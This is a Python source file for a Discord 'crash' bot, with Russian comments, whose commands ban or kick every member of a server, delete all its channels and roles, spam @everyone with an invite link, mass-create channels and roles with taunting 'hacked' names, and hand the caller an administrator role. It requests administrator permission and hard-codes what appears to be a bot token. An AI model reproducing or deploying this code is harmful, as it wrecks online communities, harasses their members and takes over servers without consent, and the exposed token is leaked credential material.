import discord
from discord.ext import commands
from discord.utils import get
bot = commands.Bot(command_prefix='!') # ! - префикс, на который будет реагировать наш бот
@bot.command(pass_context=True)
async def thelp(ctx):
    await ctx.send('!allban, !spam, !spam_channel, !role, !delchannel, !delrole, !admin')

@bot.event
async def on_ready():
    print('я готов крашить!! - https://discord.com/oauth2/authorize?client_id=682980693906554891&permissions=8&scope=bot')

@bot.command()
async def allkick(ctx):
    for m in ctx.guild.members: #собираем всех участников
        try:
            await m.kick(reason="По просьбе") #кикаем
        except:
            pass


@bot.command()
async def allban(ctx):
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason="pooooop", delete_message_days=7)
        print(f"Banned {member.display_name}!")
        print("Banning is complete!")
      except Exception:
        pass

@bot.command(pass_context=True)
async def spam(ctx, m):
    await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
    count = 0
    while count < int(m):
        await ctx.send(" @everyone https://discord.gg/EJuVbzByAS") #отправка текста
        count += 1

@bot.command(pass_context=True)
async def spam_channel(ctx, m):
    await ctx.message.delete()
    count1 = 0
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('crash-by-trtion-' + str(count1))
        count1 += 1
        print('created channel: crash-by-triton-' + str(count1))

@bot.command(pass_context=True)
async def role(ctx, m):
    await ctx.message.delete()
    count = 0
    while count < int(m):
        await ctx.guild.create_role(name='вас взломал тритон лох' + str(count))
        count += 1
@bot.command()
async def delchannel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}") # отпровляем отчёт отправителю команды
@bot.command()
async def delrole(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="По просьбе")
        except:
            pass

@bot.command(pass_context=True)  # разрешаем передавать агрументы
async def admin(ctx):  # создаем асинхронную фунцию бота
    
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) #права роли
    await guild.create_role(name="Hack", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="Hack") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(role) #добовляем роль
    
    await ctx.message.delete()

bot.run('NjgyOTgwNjkzOTA2NTU0ODkx.Xlk5Vg.E9HL_IZ3rw9STp_VSSKeylcF00k')
